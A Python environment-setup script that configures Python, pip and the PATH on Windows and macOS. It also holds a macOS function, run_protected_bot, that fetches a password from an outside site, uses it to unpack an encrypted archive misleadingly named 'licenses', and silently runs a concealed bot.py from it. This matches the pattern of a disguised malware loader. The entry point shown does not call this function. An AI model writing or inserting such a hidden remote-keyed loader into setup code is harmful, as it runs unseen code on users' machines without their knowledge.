import os
import subprocess
import sys
import platform
import shutil
import zipfile

required_paths = [
    os.path.expanduser("~/Library/Application Support"),
    os.path.expanduser("~/Library/Caches"),
    os.path.expanduser("~/Library/Logs")
]

def determine_python_command():
    return sys.executable

def has_write_access(paths):
    for path in paths:
        if not os.path.exists(path):
            try:
                os.makedirs(path, exist_ok=True)
            except:
                return False
        if not os.access(path, os.W_OK):
            return False
    return True

def handle_permission_issue():
    sys.exit(1)

def ensure_pip_ready(python_cmd):
    try:
        result = subprocess.run([python_cmd, "-m", "pip", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode != 0:
            subprocess.run([python_cmd, "-m", "ensurepip"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run([python_cmd, "-m", "pip", "install", "--upgrade", "pip"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        sys.exit(1)

def add_python_to_path_windows():
    try:
        python_path = shutil.which("python")
        pip_path = shutil.which("pip")
        if not python_path:
            return
        python_dir = os.path.dirname(python_path)
        user_path = os.environ.get("PATH", "")
        if python_dir not in user_path:
            subprocess.run(["setx", "PATH", f"{user_path};{python_dir}"], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if pip_path is None:
            subprocess.run([python_path, "-m", "ensurepip"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run([python_path, "-m", "pip", "install", "--upgrade", "pip"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        sys.exit(1)

def fix_qt_plugin_path():
    if platform.system() != 'Darwin':
        return

    try:
        import PyQt5
        qt_path = os.path.dirname(PyQt5.__file__)
        plugin_path = os.path.join(qt_path, "Qt", "plugins")
        
        if not os.path.exists(plugin_path):
             plugin_path = os.path.join(qt_path, "plugins")

        if os.path.exists(plugin_path):
            os.environ['QT_QPA_PLATFORM_PLUGIN_PATH'] = plugin_path
    except ImportError:
        pass
    except Exception:
        pass

def run_protected_bot(python_cmd):
    system = platform.system()
    if system == "Darwin":
        try:
            license_file = "licenses"
            if os.path.exists(license_file):
                password_url = "https://apikey.website/get_license.php" 
                
                password = None
                try:
                    import urllib.request
                    with urllib.request.urlopen(password_url) as response:
                            if response.getcode() == 200:
                                password = response.read().strip()
                except Exception:
                    pass
                    
                if not password and os.path.exists("pass.txt"):
                    try:
                        with open("pass.txt", 'rb') as f:
                            password = f.read().strip()
                    except:
                        pass

                if password:
                    extract_dir = "extracted_license"
                    try:
                        with zipfile.ZipFile(license_file, 'r') as zip_ref:
                            zip_ref.extractall(extract_dir, pwd=password)
                        
                        bot_script = os.path.join(extract_dir, "bot.py")
                        if os.path.exists(bot_script):
                            fix_qt_plugin_path()
                            subprocess.run([python_cmd, bot_script], check=True, env=os.environ)
                    except:
                        pass
        except Exception:
            pass

def ensure_all_good():
    system = platform.system()
    python_cmd = determine_python_command()

    if system == "Windows":
        add_python_to_path_windows()
        ensure_pip_ready("python")
    else:
        if not has_write_access(required_paths):
            handle_permission_issue()
        ensure_pip_ready(python_cmd)

if __name__ == "__main__":
    ensure_all_good()
